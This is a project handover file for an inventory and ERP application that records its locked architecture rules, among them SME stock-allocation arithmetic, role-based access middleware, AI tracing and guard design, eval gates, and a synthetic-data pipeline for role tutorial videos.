# PROJECT HANDOVER — the authority on what is locked

> **Updated 2026-09-07** by Phase 12 (Automated Role-Based Video Tutorials).
> Five slices, all merged: **12-prototype** the pipeline; **12a** the synthetic
> dataset; **12b** the manifest, WebVTT and freeze-padding; **12c** the
> declarative recorder and the first four tutorials; **12f** the assistant's
> deep links into a pre-rendered tutorial.
>
> ⚠️ **New this phase and binding: seven `P12-x` rulings (below).** The one that
> reframed the phase is **P12-0** — *a tutorial is recorded against SYNTHETIC
> data, or it is not published*. The brief asked how to stop proprietary data
> reaching HeyGen's API; that is the easy half and one function closes it. The
> hard half is that the MP4 is the sensitive artefact, and it is sensitive
> whether or not it ever touches a cloud.
>
> ⚠️ **Still open, and deliberately so:** the HeyGen submit/poll/download half
> (needs a key — narration egress is signed off, 2026-09-06) and object storage
> for the renders (waits for the Hetzner cutover). Neither blocks anything.
>
> *(Previously updated 2026-09-05 by Phase 11 — Enterprise AI Engineering,
> Observability & Security Gateways. Six slices, all merged: **11a** the CI fix
> + harness auditor + `CLAUDE.md`; **11b** the OCR timer, the ditto fix and the
> cloud seam; **11c** request tracing (`ai_traces`); **11d** the input/output
> guards; **11e** the model gateway + answer cache; **11f** the eval gates.)*
>
> Still binding from Phase 11: **twelve `P11-x` rulings (below) and RULE 16 —
> the harness is audited, and a SKIP is not a PASS.** Rule 16 exists because a
> check reported `2/2` for an assertion that had never executed on any machine,
> and because one line of `bug_check.py` broke CI for 30 consecutive runs.
>
> *(Previously updated 2026-08-13 by the workflow-polish and test-isolation pass.)*
> This file holds the LOCKED architecture rules, the baselines, and the
> developer utilities. It is the authority; when anything else disagrees with
> it, it wins.
>
> **New in this revision: rule 15 — the tests do not open the live database.**
> `service_tests` commits through the real ASGI app and cannot roll back, so it
> now builds and runs against its own `gihub_svctest` and **refuses to start**
> if that resolves to the same database as the source. Two schema/data gaps in
> the production cutover were found the moment the suite began running against
> a database built the way production builds one — see rule 15 and *FUTURE*.
>
> Still binding from the previous revision: **rule 13 —
> `MANUAL_TESTING_GUIDE.md` is part of the Definition of Done.** A feature
> change that does not update it is not done.
>
> **Starting a fresh session? Read [`SESSION_HANDOVER.md`](SESSION_HANDOVER.md)
> first** — it is the five-minute orientation, and it points back here for the
> detail. Then [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) (the system
> brain), [`docs/PROJECT_STATUS.md`](docs/PROJECT_STATUS.md) (full state +
> gotchas) and [`REPO_MAP.md`](REPO_MAP.md) (the segregation contract).
>
> **Next phase is a CHOICE, not a queue** — Tier 1 security hardening
> ([`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md)) or the Hetzner
> deployment. See *FUTURE* at the foot of this file.
> **Hetzner production deployment is PAUSED by decision, not by blocker.**

---

## PAST — critical architecture rules, LOCKED

These are decisions that were each made *because the alternative was tried and
broke something*. Do not revisit them without an explicit instruction.

**The five that break things silently if you get them wrong.** Read these before
touching SME maths, any export, or anything role-gated — each one was a live bug
whose symptom appeared far from its cause:

| # | Rule | The one line that matters |
|---|---|---|
| **1c** | **SME SUBSET RULE** | `Ordered_Qty` is the TOTAL procured; `Available_Qty` is the part that ARRIVED. **Tier 2 = `max(ordered − available, 0)`**, never `ordered`. Adding them double-counts stock already on the shelf — it understated the buy list by 22,951 units. |
| **1b** | **SME TIER SEGREGATION** | Physical stock and pipeline stock are **never merged in the UI or in any KPI**. `Allocated_Qty` is a conservation field, NOT a coverage numerator. Six presentation layers got this wrong and overstated buildable area by 21.5 %. |
| **1a** | **SME ⇄ ERP DECOUPLING** | Every SME number comes from `sme_inventory_seed` and nowhere else. A receipt, issue or return must not move a single SME figure. |
| **1** | **COMPONENT IDENTITY** | The key is `(Material_Code, SAP_Code)`. Pooling by code alone summed four unlike drums and *inverted* the shortfall. |
| **7** | **RBAC — AUDITOR** | View-only is enforced by **method-level ASGI middleware** (`backend/api/readonly.py`), never per-endpoint. Every `POST/PUT/PATCH/DELETE` is refused unless it is on the small documented allowlist — so a route added next year is closed by default instead of failing open. |

Rules 2-6 and 8-14 below are equally binding; those five are simply the ones a
newcomer is most likely to undo by accident.

**Two more that the QSEP programme added (2026-08-09), both stated in full
later in this file:**

* **Rule 13 — `MANUAL_TESTING_GUIDE.md` is part of the Definition of Done.** A
  feature change that does not update it is not finished, and a role added to
  `ROLE_META` must be added to the assistant's chapter map and the printed
  booklet recipes in the same commit.
* **Rule 14 (2026-08-12) — navigation access is a ROLE MATRIX and it fails
  closed.** `minLevel` is a seniority ladder and the roles are not one, so a
  page names the jobs that need it (`anyRole`). `canAccessPath` refuses any
  path it does not recognise, `npm run test:nav` fails the build when a route
  has no rule, and narrowing a page means narrowing its endpoints in the same
  commit — a menu is not a control.
* **The QC block is the FIRST hard block on the issue path, and it does not
  overturn FEFO.** `services/quality.assert_qc_cleared` refuses to issue
  controlled material beyond what QC has released. That is about QUALITY STATUS
  and covers 36 SAPs. **FEFO and over-issue remain allow-and-log** — never
  implement this by promoting the existing FEFO warning to an error.

### Phase 10 rulings, LOCKED (2026-09-02/03)

Each of these was decided by the operator and each has a plausible-looking
"improvement" that would undo it. They are numbered P10-x and referenced by
that name in the code.

| # | Ruling | Why it is not an oversight |
|---|---|---|
| **P10-1** | **POSTGRES, NOT REDIS** for every shared limiter (`rate_buckets`, `login_attempts`). | Re-confirmed rather than assumed. The counters tick a few times a minute; Postgres is already deployed, backed up, in the runbook and holding the users table it protects. Redis is a new daemon and a new 3 a.m. failure mode. Revisit only if the app runs on more than one box. |
| **P10-2** | **The rate limiters FAIL OPEN; the daily-job claim FAILS CLOSED.** | Deliberately opposite, and both are correct. A throttle whose storage hiccups must not deny sign-in. A daily job that cannot claim must not run, because a missed briefing is silence somebody notices and a double one is four messages everybody ignores. The **access matrix** fails closed too (`nav_routes_check`), which is a third thing again — do not "make them consistent". |
| **P10-3** | **The OCR training gate is SOFT and gates the ACTION, not the page.** | Phase 9 made the photo the primary way consumption is filed. A hard gate stops a supervisor filing a form at 06:00 because of a video — the same shape as FEFO (allow-and-log) and the MTC gate (moved out of receipt). "Watch later & continue" runs the upload. If it is ever made hard, the refusal must move **server-side** into `POST /execution/ocr/upload`; a UI-only gate is not a control. |
| **P10-4** | **Un-costed inventory is NEVER valued at zero.** | Every `Unit_Cost` on the live data is 0. Summing them produces `SAR 0.00` for a site holding 731 units — arithmetically correct and a lie a board would act on. They are counted as **"Not Valued (N items)"** and the total is labelled a **floor**. |
| **P10-5** | **The board brief is PDF only (fpdf2).** | `python-pptx` is a second renderer with a second branding implementation that will drift from the first; `reportlab` is in `requirements.txt` but touched only by one legacy smoke test. `_ValuationPDF` subclasses `_ExecPDF` so there is exactly one GI navy. |
| **P10-6** | **`module_version` is part of the training-compliance unique key.** | Keyed on `(user, module)` alone, re-recording a tutorial would leave everybody certified against a video they have never seen — worse than no record, because it would be produced as evidence. Old rows are kept and simply stop matching. |
| **P10-7** | **Tier 1 AI evals gate a merge; Tier 2 never does.** | Tier 1 audits the system prompt and is deterministic. Tier 2 audits the model's answer and is stochastic — wiring it into CI produces a flaky gate, and a flaky gate is one people re-run rather than read. Its threshold is deliberately left above the measured score rather than tuned down to pass. |
| **P10-8** | **External WhatsApp is a DRAFT; internal email goes to Logistics only.** | A chase that leaves the company is read as the company's position, and an automated one naming the wrong PO is a commercial mistake nobody reviewed. Everything internal still sends automatically. |
| **P10-9** | **`sme_execution_entry.Shift` is never inferred from the clock**, and NULL is skipped rather than assumed. | An entry is filed when somebody reaches a desk, not when the work happened; a night crew filing at 06:40 would be counted as day shift on a timestamp nobody looked at. Every pre-10b row is NULL and there is no honest backfill. |
| **P10-10** | **`read_bucket_shared` is not a style variant of `check_bucket_shared`.** | The counting one INCREMENTS, so asking it "is this IP banned?" creates the ban it was asking about — the first invalid webhook signature answered 429 instead of 403 until suite `limits` caught it. A test and a tally are different verbs. |

### Phase 11 rulings, LOCKED (2026-09-03/05)

Numbered P11-x and referenced by that name in the code. Each was decided by the
operator or forced by evidence, and each has a plausible "improvement" that
would undo it.

| # | Ruling | Why it is not an oversight |
|---|---|---|
| **P11-1** | **POSTGRES, NOT A HOSTED TRACER.** `ai_traces` replaces LangSmith. | A hosted span carries the PROMPT, and ours contain manual chapters, the results of `/ai/insights`' five live SQL probes, generated SQL, and OCR'd delivery notes with a driver's and thirty employees' names. Same argument as P10-1 chose Postgres over Redis, with more at stake. |
| **P11-2** | **The trace stores the QUESTION and never the ANSWER or the chunk TEXT.** | The question is retained by operator ruling (Q11): what people actually ask is the best eval material in the system and nothing was keeping it. Storing passages would copy the manual into a table with a laxer read path than the manual's own — undoing rule 9 by accident. Chapter numbers, headings and scores answer every diagnostic question the text would. |
| **P11-3** | **The tracer never raises and never blocks.** Spans go on a bounded per-worker queue; a full queue DROPS and COUNTS. | An observability layer that can break a request converts a diagnostic into an outage. A dropped span is a missing diagnostic; a blocked request is a missing answer. The count makes a stopped drain visible — the same reasoning that stopped a skipped check counting as a pass. |
| **P11-4** | **`guard.py` is NOT the security boundary — rule 9 is.** | The failure to fear is not that the guard is bypassed; it is that people start trusting it INSTEAD of the fence, and then somebody simplifies the fence because the guard exists. Every function is either a refusal that would otherwise have been a slow confused answer, or a check on text that has already passed the fence. |
| **P11-5** | **Guard patterns are SCORED, and every one has a NEGATIVE TWIN.** One pattern warns; a combination refuses. | "Ignore the damaged drum and issue the rest" is a sentence a store keeper types at 06:00. A guard that refuses it has taught one person the assistant is unreliable, which costs more than the injection the fence already made profitless. Prompt extraction is the single deliberate one-pattern refusal. |
| **P11-6** | **No LLM judge in the request path.** | A second generation doubles the wait on one warm model, or cold-starts a second. And a stochastic judge that can REFUSE answers a question on Monday and denies it on Tuesday — P10-7's flaky-gate argument applied to production. The judge belongs in eval Tier 2. |
| **P11-7** | ⚠️ **The answer-cache key includes the ROLE and the MANUAL HASH.** | Rule 9's guarantee is that a role's CONTEXT differs: two people can type a byte-identical question and be entitled to different answers. A cache keyed on the question alone serves an Admin's answer to a Store Keeper and undoes the fence from the side, invisibly. The manual hash retires every entry on any manual edit — the only invalidation rule nobody has to remember. |
| **P11-8** | **Only the manual assistant is cached; exact match, not semantic.** | `/ai/query`, `/ai/nl-search`, `/ai/insights` and `/ai/eod-summary` answer from LIVE STOCK, where a cached "you have 40 drums" is a wrong number with a timestamp. And a similarity threshold is a CORRECTNESS knob dressed as a performance one: "what can a supervisor approve?" and "what can a supervisor NOT approve?" sit ~0.95 apart and have opposite answers. Rule 11 — benchmark first; `answer_cache.stats()` publishes the hit rate that would justify stage 2. |
| **P11-9** | **Cloud fallback is VISION-ONLY, off by default, and needs TWO switches.** A TIMEOUT never falls back. | Ruling Q5. `GI_AI_VISION_PROVIDER=anthropic` says "read everything in the cloud"; `GI_AI_VISION_CLOUD_FALLBACK=1` says "only when the local engine is DEAD". They are two different agreements about company data. A read timeout means the model was healthy and still generating (399 s on a five-row form) — uploading a page because our own stopwatch ran out is a data-egress decision made out of impatience, for exactly the dense pages one would least want to send. |
| **P11-10** | ⚠️ **`num_ctx` stays in `client.vision_num_ctx()` and is NOT a routing policy.** | This is why LiteLLM was rejected. It is a computation over the image THIS request carries; getting it wrong does not truncate, it ABORTS the Ollama runner (`ggml_abort`) and takes every queued job with it. A library's Ollama adapter passes its own options dict, which hands that decision to a default and re-opens the bug silently. Portkey was rejected harder: a Node daemon in the request path is P10-1's objection, enlarged. |
| **P11-11** | **Eval gates are split by DETERMINISM, not by name.** Contextual Recall/Precision gate at ≥0.85; Faithfulness, Answer Relevance and Safety are trended and open a bug row. | The brief asked for an 0.85 CI gate; P10-7 forbids gating a stochastic metric. Retrieval metrics are a pure function of BM25 over a fixed corpus and can carry the floor honestly. The 800-character truncation that hid §2's access matrix from every non-admin role was a retrieval regression that survived a phase — this gate fails the commit that causes it. |
| **P11-12** | **`tests/ai_eval/cases/grid.yaml` is GENERATED, never hand-edited**, and `baseline.json` is only moved by `--record`. | A hand-written expectation drifts into fiction: slice 11d asserted §2 would answer "how do I add a user" because its title sounds like it would (it contains none of that vocabulary). And BM25's `idf` is corpus-wide, so a new chapter perturbs every role's ranking. A self-updating baseline ratchets in whichever direction the model drifts, so a slow decline becomes the new normal and the alarm never fires. |

### Phase 12 rulings, LOCKED (2026-09-06/07)

Numbered P12-x and referenced by that name in the code. Phase 12 produces
**role tutorials**: a Playwright screencast of the real UI, a HeyGen avatar
narrating a script, composited locally into an MP4 that lands in the training
hub Phase 10 already built (`training_modules` / `training_assets` /
`training_compliance`, slice 10b).

⚠️ **P12-0 reframed the phase and is the one to read first.** The brief asked
how to stop proprietary data reaching HeyGen's API. That is the easy half, and
`assert_text_only()` closes it in one function. The hard half is that the
**MP4 is the sensitive artefact** — a file people forward, put on a phone and
send to a contractor — and it is sensitive whether or not it ever touches a
cloud.

| # | Ruling | Why it is not an oversight |
|---|---|---|
| **P12-0** | ⚠️ **A tutorial is recorded against SYNTHETIC data, or it is not published.** `tools/make_tutorial_db.py`, never `gi_database.db` and never its E2E clone. | `tests/e2e/global-setup.ts` loads its throwaway database from the REAL `gi_database.db` via `cutover_migrate.py`. That is correct for a test suite whose rows never leave the machine and wrong for a video. The prototype's first frame carried real employee names, real material descriptions, real SAP codes and real quantities. **Redaction is not the answer**: the in-page mask only hides what somebody thought to name, and it is a second line. Operator ruling Q1 sets the split — keep the real STRUCTURE (the 11 categories, the 14 lining systems, roles, UOMs), invent every name, description, SAP code, quantity, price and date. `--collision-check` proves the invented names absent from a real register (opt-in, read-only, never a default). |
| **P12-1** | **The HeyGen payload is a PROVENANCE WHITELIST, not a scrubber.** Every free-text field must be character-for-character a reviewed `say:` line from the tracked YAML. | A scrubber asks "does this look dangerous?" and is only as good as the last incident. A whitelist asks "did a person approve this exact sentence in a diff?" and is complete on day one. Same shape as rule 9: the fence runs BEFORE the thing it protects. ⚠️ It works — it refused its own first payload, because the builder and the whitelist were separate functions. They are one function now, so a new field cannot be added without naming its source. |
| **P12-2** | **The screencast NEVER leaves the machine.** The avatar comes back as a clip and ffmpeg composites LOCALLY. | This is the architecture in one sentence, and it rules out the HeyGen features that will be tempting later — *video translate*, *avatar from a screen recording*, anything that takes an upload. Those are not integrations; they are the exact egress this design exists to prevent. |
| **P12-3** | **The assistant's on-screen answer in a recording is SCRIPTED, not sampled.** The model is never called while recording. | Three reasons, ascending: a tutorial is re-rendered whenever the UI moves, and an 8B model answers differently every time, so a re-render would silently change what the video TEACHES; the answer is user-visible copy, and scripted it is reviewed in a diff while sampled it is reviewed by nobody; and `docs/PROJECT_STATUS.md` §1a already records what this model does when unsure — *it invents UI no chapter describes*. ⚠️ This does not weaken rule 9: nothing reaches the fence, because nothing reaches the model. |
| **P12-4** | **Recording is a test-shaped activity and obeys RULE 15.** It reuses the E2E suite's `global-setup`, `auth.setup.ts`, `harness/env.ts` and `node_modules`, on its own database `gihub_tutorial_pw` at :8011/:5184. | A second stack builder is a second place for rule 15 to be got wrong, and this one would be got wrong quietly — a tutorial recorded against `gihub` looks identical to one recorded against a clone. Reuse makes it structurally impossible instead of a thing to remember. The four environment variables (`GI_DB_FILE`, `E2E_DB`, `E2E_API_PORT`, `E2E_WEB_PORT`) that redirect it are ones `env.ts` already read, so **no file under `tests/e2e/` was edited**. |
| **P12-5** | **Every render writes a MANIFEST**: `script_sha256`, payload hash, dataset name + version, git SHA and dirty flag, declared vs actually-visited routes, video hash, and every beat with its measured narration length. | Operator ruling Q4 bumps a module's `training_modules.version` when the NARRATION or the process changes and **not** for a cosmetic re-render — so something must answer "did the script change?" a year later without re-deriving it from a script that has since changed again. That is `script_sha256`, and the batch runner decides what to re-render from the same number. ⚠️ Its consequence is that **the dataset is deterministic**: a fixture built from `date.today()` would move every number on screen daily while the hash said nothing had changed, and the compliance record would point at a video nobody has seen (P10-6). Every date comes from a pinned `ANCHOR`; it ages on purpose, because ageing is a versioned decision somebody makes and drift is one nobody notices. |
| **P12-6** | **The deep-link matcher's ROLE FENCE runs BEFORE the score, and it is the SAME fence.** `tutorials.match()` reuses `manual_index.Index.search(allowed=…)` with `allowed` built from each script's declared `audience`. | Re-implementing an access decision would be a second copy of the one thing P11-4 says must not acquire one. A tutorial a role may not watch is never a candidate, so no phrasing reaches it. A manifest with no `audience` falls back to the role it was RECORDED as, **never to everyone** — an old file cannot widen an audience by omission. And the link grants nothing: `/training` is nav-guarded, the module list is still the server's role-filtered one, and the URL carries a module key, a language and a number of seconds. |

⚠️ **And one thing about the matcher that a threshold cannot fix.**
`manual_index._tokens` expands SYNONYMS — "valuation" becomes
"stock value board brief not valued" — so a Store Keeper asking about the
executive summary's valuation floor shared the single accidental token "stock"
with "This is Return Stock", and the 2.4× heading boost scored it 4.95 over a
floor of 4.0. Raising the floor killed the coincidence **and** a real hit (an
HOD asking "what does not valued mean" scores 4.59 against the beat that exists
to answer it). So a candidate must also share **at least two distinct tokens**
with the beat it won on: one word in common is a coincidence, two is a topic.
Suite CX-04 is the trap and CX-15 is the control that stops the fix becoming a
bigger number.

### 16. THE HARNESS IS AUDITED, AND A SKIP IS NOT A PASS

*Locked 2026-09-02 (Phase 11 slice 11a).*

`postgres-dual-ci.yml` failed on 30 consecutive runner executions while
`legacy/bug_check.py` passed 599/0 on macOS, and the run page blamed a WhatsApp
retry test that was working perfectly. Three defects, and the third is the rule:

1. **The annotation shim greped stdout for `❌`.** `run_check` prints that glyph
   only under `--verbose`, which CI does not set — so the grep matched nothing
   from the harness and everything from the APPLICATION log, where
   `whatsapp_worker` legitimately prints it on its normal terminal-failure path.
   It now parses `BUG_REPORT.md`'s `###` failure headings.
2. **`subprocess.Popen = lambda *a, **kw: None`** for the whole run.
   `ctypes.util.find_library` on Linux opens with
   `with subprocess.Popen(['/sbin/ldconfig','-p']) as p:` — so `with None:`
   raised `TypeError`, which `_findSoname_ldconfig`'s `except OSError` does not
   catch, and `import pyzbar` died. On macOS `find_library` probes dyld and
   never shells out, which is why every "simulated CI condition" passed: they
   were all simulated on the Mac. The guard now blocks by BEHAVIOUR — argv[0] in
   a set of GUI launchers gets a stand-in honouring the `Popen` contract;
   everything else reaches the real one.
3. ⚠️ **AND THE CHECK HAD NEVER RUN ANYWHERE.** Homebrew's libzbar is not on
   dyld's search path, so macOS raised `ImportError`, the check's
   `except ImportError: return` swallowed it, and the report said
   `QR Badges 2/2` for an assertion that had never executed on any machine.

**So: a SKIP is a third status — counted, printed, listed in its own report
section, and surfaced in CI as a `::warning::`.** Never fold one into the pass
total. `bin/ci_preflight.sh` + `tools/harness_hygiene.py` gate the class rather
than the instance (process-wide stdlib monkeypatches, unrestored module
patches, one-exception dependency guards, silent no-ops, unrestored sender
mocks), run first in CI in about a second, and carry ten negative controls
proving each rule still fires on its bug and stays quiet on its fix.

⚠️ **On macOS the QR round-trip skips unless you
`export DYLD_FALLBACK_LIBRARY_PATH=/opt/homebrew/lib`** — with it, 599/0/0.

### 1. SME allocation is keyed on `(Material_Code, SAP_Code)` — never pool by code alone

*Locked 2026-07-30. Overturns the 2026-07-18 Material_Code pooling rule.*

A multi-part chemical system lists **one `Material_Code` as several distinct
physical drums**, separated only by the variant SAP — `GI-8005765` is Comp-A/B/C/D
at SAPs `1041` / `1041-1` / `1041-2` / `1041-3`. Each is a different container on a
different shelf.

* The engine key is `mat_key(Material_Code, SAP_Code)` → `"CODE|SAP"`, exposed on
  every allocation line as **`Material_Key`**.
* Each component gets its **own** available pool, on-order pool, shortfall and
  report row.
* SAP codes are **whitespace-normalized on both sides** of every join — the ERP
  writes `"1043 - 2"` for the recipe's `"1043-2"` (`sap_norm()` / `sapNorm()`).
* `sme_inventory_seed`'s primary key is **`(Material_Code, SAP_Code)`**
  (alembic `a4e9b1c73f28`).
* **No exceptions remain.** The Smart Calculator was the last holdout — it kept
  the 2026-07-18 `Material_Code` pooling until **2026-08-04**, when the operator
  authorized overturning it there too. `_CALC_POOL_SQL` now groups and joins on
  `(Material_Code, SAP_Code)`, and the UI displays the variant SAP. Live proof:
  on `GI-8005766` at 1,000 m², the catalyst `1042-3` holds 50.5 against a demand
  of 67.34 — pooled it saw 3,080.5 and the whole system reported **0 shortfall
  lines**.

**Why it is not negotiable:** pooling summed four unlike drums into one bucket, so
earlier recipe lines drained stock belonging to later ones. Measured on real data,
it reported components A and B as **fully covered while both were 10 short**, and D
as **10 short while it held three times what it needed**. The shortfall was not
imprecise — it was *inverted*, and SQM-achievable collapsed to 0 against a true 20.
Four `az-revert` checks in suite AZ pin each of those failures.

**Also locked:** `Material_Name + UOM` is **not** a valid discriminator. All four PU
rows in `For_1_SQM.xlsx` carry the same name *and* the same UOM; the names disagree
between the two workbooks; the UOM disagrees on 25 of 32 pairs. `SAP_Code` is the
only real discriminator.

### 1a. The SME estimator is STRICTLY DECOUPLED from the ERP ledger

*Locked 2026-08-02. Supersedes the 2026-07-28 effective-ordered netting (ruling Q2a).*

The estimator and the warehouse are **two separate pools of data, calculated
completely separately**. An ERP receipt, issue or return is a warehouse event and
must not move a single SME number.

* Every SME quantity comes from **`sme_inventory_seed`** — the data ingested from
  `Materials_DetailsAvailable_Qty.xlsx` — and from nowhere else.
* `available_qty` **is** `Initial_Available_Qty`; `ordered_qty` **is**
  `Initial_Ordered_Qty`. No derivation, no join.
* `receipts` / `consumption` / `returns` / `inventory` are **never named** by
  `SQL_SME_MATERIALS` or by `_CALC_POOL_SQL` (Smart Calculator). Suite BA greps for
  them, and — more to the point — posts real movement against an SME material's own
  SAP and requires **every SME read to come back byte-identical**.
* The snapshot the browser engine consumes carries **no `received_qty` /
  `consumed_qty`** field at all.

**What this overturns.** The two places the ledger used to leak in were
`SQL_SME_MATERIALS` (`available = seed + Σreceipts − Σconsumption`, joined through
the ERP `inventory` master) and the Smart Calculator, whose entire stock pool was
`Σreceipts − Σconsumption − Σreturns`.

**And why the netting had to go with it.** `effective_ordered =
max(Initial_Ordered_Qty − Σreceipts, 0)` existed *only* because arriving goods
inflated `available_qty` through the ledger, so counting the order as well
double-counted them. With nothing inflating availability, subtracting receipts
would strip units from the order that were never added — `GI-8005762` would lose
the 10,920 it had received against an order of 95,200. Both engines now take
`ordered_qty` at face value, clamped at zero. The parity fixture deliberately still
carries `received_qty` values (M1 = 40, M2 = 15, M6 = 25) as **poison pills**: the
golden proves both engines *ignore* the field rather than merely proving it is
absent from the payload.

Decoupled is not frozen — editing `sme_inventory_seed` (what the Excel sync writes)
still moves every SME number at once. Suite BA pins that too.

### 1b. STRICT TIER SEGREGATION — a purchase order is never readiness

*Locked 2026-08-03.*

**TIER 1** (`Alloc_Available` / `pool_init`) is the ONLY input to readiness:
`Status`, `Completion_Pct`, `SQM_Achievable_Now`, `Coverage_Now_Pct`,
`Fulfillment_Pct`, `SQM_Deficit`, and every "can we build it today" answer.

**TIER 2** (`Alloc_Pending` / `pool_pending_init`) feeds ONLY the forward-looking
twins — `Completion_With_Ordered_Pct`, `SQM_Achievable_With_Ordered`,
`Coverage_With_Ordered_Pct`, `Fulfillment_With_Ordered_Pct` — and the NET buy
list (`Shortfall_Qty`), so stock already ordered is not ordered twice.

**`Allocated_Qty` (= tier 1 + tier 2) is a CONSERVATION field.** It exists so
`Demand = Allocated + Shortfall_Qty` holds. It is NOT a readiness quantity, and
`Allocated_Qty / Demand_Qty` is NOT a coverage percentage anything may colour
green. Every tier-2 number a consumer could want is published as its own named
field precisely so nobody re-derives one from it.

**Why it is not negotiable:** the engine always had this right; six presentation
layers above it did not. `PHENACIN ACP POWDER` (0 available, 56,350 on order)
made **18 of 85** (tag, code) units render a green "100% Fully Ready" pill they
had not earned, listed them under the *Fully Ready* filter, and overstated
buildable area by **9,118 m² — 21.5 % of the remaining programme**. Suite BB
(18 checks) and `tests/e2e/specs/sme-tiers.spec.ts` (4 tests) pin it end to end.
Full account: [`docs/SME_TIER_SEGREGATION_RUNLOG.md`](docs/SME_TIER_SEGREGATION_RUNLOG.md).

Every SME tab shows the two tiers in separate columns, under a shared `TierNote`
legend: **green = available now · amber = on order · red = still to buy**.

### 1c. THE SUBSET RULE — Available is part OF Ordered, not extra to it

*Locked 2026-08-05 (operator correction on the shape of the source data).*

In `Materials_DetailsAvailable_Qty.xlsx`, **`Ordered_Qty` is the TOTAL quantity
PROCURED for the project** and **`Available_Qty` is the portion of it that has
physically ARRIVED**. Available is a SUBSET of Ordered, never a second bucket
beside it.

```
tier 1  = available_qty
tier 2  = max(ordered_qty − available_qty, 0)     the PENDING DELIVERY
ceiling = tier1 + tier2 = max(available, ordered) = Allocated_Qty
to buy  = max(demand − max(available, ordered), 0) = Shortfall_Qty
```

Everything but tier 2 falls out of the existing cascade arithmetic; only
`build_model` changed in each engine.

**Why it is not negotiable:** the engine added the two buckets, double-counting
every unit already on the shelf. Verified on all 32 workbook rows — `available ≤
ordered` everywhere, **14 of 32 fully delivered**. Reconciled against
`dashboard_material_balance.xlsx`: **22 of 30 report rows had an understated buy
list, 22,951 units in total**. `GI-8005763` (143,000 arrived of 143,000 ordered)
read **286,000**, reported **nothing to buy** against a demand of 152,685, and
hid a **9,685-unit shortage** entirely. Suite **BC** (16 checks, two of which
read the live workbook) and `test:ui-math` §E pin it.

**Naming:** the tier-2 quantity fields are `Alloc_Pending` /
`pool_pending_init` / `Pending_Delivery_Qty`, and every report states
`Total_Procured_Qty` beside them. The `*_With_Ordered_*` coverage fields keep
their names — they measure against the *total procured*, which is what they
always meant — and the UI labels them **"When delivered"**. UI wording: second-
tier quantities read **"Pending Delivery"**, second-tier coverage reads **"When
delivered"**.
Full account: [`docs/SME_ORDERED_SUBSET_RULE_RUNLOG.md`](docs/SME_ORDERED_SUBSET_RULE_RUNLOG.md).

### 2. Two-tier allocation field contract

*Locked 2026-07-28 (rulings Q1/Q6). The Q2a netting half is superseded — see 1a;
which figure each tier may drive is 1b.*

Companion field contract, conserved on every line:

```
Demand_Qty      = Allocated_Qty + Shortfall_Qty
Allocated_Qty   = Alloc_Available + Alloc_Pending   (= the total procured)
Shortfall_Available_Qty = the PHYSICAL gap  → drives feasibility / "Ready to Build"
Shortfall_Qty           = the NET gap       → drives the buy list
```

Feasibility judges **tier 1 only**: stock on a truck cannot be applied to a tank
today.

### 3. `tools/pg_excel_sync.py` — native upserts, no Pandas

* **SME by default; the ERP half is opt-in** *(2026-08-02, with rule 1a)*. The
  everyday command syncs `sme_recipe` / `sme_equipment` / `sme_inventory_seed` only:

  ```bash
  DATABASE_URL=postgresql+psycopg2://postgres@127.0.0.1:5433/gihub \
  .venv/bin/python tools/pg_excel_sync.py --site CNCEC [--commit]
  ```

  It prints `scope : SME tables only — the ERP warehouse is untouched`, and never
  opens `CNCEC_Inventory.xlsx`. Writing the live warehouse master or appending to
  its ledger requires `--erp` (or naming `inventory` / `ledger` in `--kinds`),
  which prints `⚠️ ERP + SME — this run WRITES the live warehouse`.
* **Header names must be listed exactly.** `bulk_import._col` matches
  case-insensitively but does **not** normalise spaces vs underscores. The live
  `Materials_DetailsAvailable_Qty.xlsx` ships **`Available Qty`** (space) beside
  `Ordered_Qty` (underscore); with only the underscored alias the column resolved
  to `None` and all 30 materials re-baselined to the `0.0` that summing no cells
  produces. A quantity column the workbook omits is now **left alone** (the field
  is dropped from the plan, so `COALESCE` keeps the stored value) and reported as
  a warning, instead of silently zeroing.
* Every master-data write is `INSERT … ON CONFLICT (<natural key>) DO UPDATE` with
  `COALESCE(excluded.col, table.col)`, so a blank workbook cell never erases data.
* **Pandas is deliberately not used.** It is not in `backend/requirements.txt` (it
  arrives only transitively via streamlit for the legacy app), so a production-path
  tool must not import it. The reader is openpyxl via `bulk_import.py`.
* **Column-mapping logic is never duplicated** — the planners live in
  `backend/api/bulk_import.py` and this tool replaces only the *write* path.
* The whole sync is **one transaction** across all five kinds; a failure anywhere
  rolls everything back.
* It refuses to run against anything that is not a Postgres URL, and refuses
  outright if the URL mentions `gi_database`.
* Ledger tables (`receipts`/`consumption`/`returns`) have **no** unique constraint
  and must never get one — the same (date, SAP, qty) line can legitimately repeat.
  Idempotency there comes from `plan_ledger`'s three-tier reconcile.

### 4. The cutover protects the 86 blank-SAP legacy recipe rows

The frozen legacy SQLite `sme_recipe` and `sme_inventory_seed` **have no `SAP_Code`
column at all**. A cutover therefore lands 86 recipe rows with no SAP and every
material as one blank-SAP seed row.

* Those 86 rows are **real recipe data the workbook does not cover** — measured:
  they are *disjoint* from the 30 workbook-coded `(code, material)` pairs, zero
  overlap. **Nothing deletes them.**
* Blank-SAP *seed* placeholders are retired only when **both** hold: (a) the
  workbook supplied a real SAP for that `Material_Code`, **and** (b) no blank-SAP
  *recipe* line still references it. Guard (b) was learned the hard way — without
  it, coverage collapsed to **0.0% across all 29 equipment**, because those recipe
  lines can only draw on a blank-SAP seed row.
* The documented remedy for a mixed state is the **SME reseed**
  (`pg_excel_sync --sme-reseed`), which replaces both sides from the workbook and
  converges to `sme_recipe` 41 rows / `sme_inventory_seed` 32 rows, zero blanks.

### 5. Global tables render through `smartTable.tsx`

`frontend/src/lib/smartTable.tsx` is a drop-in replacement for antd's `Table`.
All 99 `<Table>` instances across 45 files import `Table` from there instead of
from `'antd'`. It derives sorters and filters from the column definitions with
**no change at the call site and no added chrome**.

Four rules it encodes:

| Rule | Why |
|---|---|
| No `dataIndex` → no sorter | An "Actions" column of buttons has nothing to sort by |
| Numeric → sorter, no filter | A quantity is a measurement, not a category |
| Boolean → sorter, no filter | A "true/false" dropdown rarely matches what the cell renders |
| **Server-paginated → untouched** | Sorting one page of 20 out of 5,000 *looks* like it works and silently lies |

Server-side paging is **auto-detected** from controlled pagination (`total` **and**
`current` both set); four grids match and all four opt out. Filters cap at 30
distinct values and grow a search box above 8. An explicit `sorter`/`filters` on a
column always wins; `smart={true|false}` overrides the sniff.

